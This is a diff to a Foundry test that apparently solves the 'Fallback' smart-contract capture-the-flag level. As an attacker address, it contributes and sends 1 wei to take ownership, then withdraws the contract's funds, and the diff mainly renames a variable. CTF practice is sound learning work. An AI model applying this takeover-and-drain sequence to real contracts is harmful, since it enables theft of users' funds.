@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import "../src/01_Fallback.sol";
 
 contract FallbackTest is Test {
-    Fallback fallbackContract; // fallback is reserved in solidity
+    Fallback _fallback; // fallback is reserved in solidity
     address deployer;
     address attacker;
 
@@ -15,22 +15,20 @@ contract FallbackTest is Test {
 
         vm.deal(attacker, 2 wei); // Fund attacker
 
-        fallbackContract = new Fallback();
+        _fallback = new Fallback();
 
     }
 
     function testSolution() public {
         vm.startPrank(attacker);
         
-        fallbackContract.contribute{value:1 wei}();
+        _fallback.contribute{value:1 wei}();
 
-        address(fallbackContract).call{value:1 wei}("");
+        address(_fallback).call{value:1 wei}("");
 
-        fallbackContract.withdraw();
+        _fallback.withdraw();
 
-        vm.stopPrank();
-
-        assertEq(fallbackContract.owner(), attacker, "Attacker is not the owner!");
-        assertEq(address(fallbackContract).balance, 0, "Fallback contract still has funds!");
+        assertEq(_fallback.owner(), attacker, "Attacker is not the owner!");
+        assertEq(address(_fallback).balance, 0, "Fallback contract still has funds!");
     }
 }
